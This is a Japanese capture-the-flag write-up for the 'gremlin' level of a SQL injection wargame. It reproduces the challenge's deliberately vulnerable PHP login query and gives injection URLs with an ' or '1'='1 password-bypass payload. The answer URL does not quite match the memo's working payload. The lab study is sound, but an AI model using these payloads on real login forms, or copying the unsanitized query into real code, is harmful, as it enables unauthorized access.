# gremlin

## answer

```
https://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=admin&pw=) or '1'='1
```

## problem

```
query : select id from prob_gremlin where id='' and pw=''

<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?>
```

## memo


```
https://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php?id=12&pw=aaaa
```

みたいに打ち込んであげると、「query : select id from prob_gremlin where id='12' and pw='aaaa'」という文字が画面に現れる。

```
返り値 = preg_match(/正規表現パターン/,検索対象の文字列,[配列],[動作フラグ],[検索開始位置])
```

コードを読んでいくとid、pwパラメータに「prog」or「_」or「\.」or「\(\)」、これらが```preg_match```（phpの正規表現マッチングを行う関数）によってヒットしたとき、exit。```preg_match``` は ```i``` を入れることによって大文字小文字を区別せずに検索できる。

```mysql_fetch_array``` 関数は、取得した行に対応する配列を返す関数である。```mysql_query``` 関数は、MySQLクエリを送信する関数である。


目的としては```solve("gremlin")```関数を実行させること。

queryに ```select id from prob_gremlin where id='1' and pw='a' or '1' = '1'``` とかが実行できたら良さそうかな〜なんて思いながら実行

```
https://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php?id=1&pw=a' or '1'='1
```

## references

- [preg_match | php manual](https://www.php.net/manual/ja/function.preg-match.php)

- [mysql_fetch_array | php manual](https://www.php.net/manual/ja/function.mysql-fetch-array.php)

- [mysql_query | php manual](https://www.php.net/manual/ja/function.mysql-query.php)

- [highlight_file | php manual](https://www.php.net/manual/ja/function.highlight-file.php)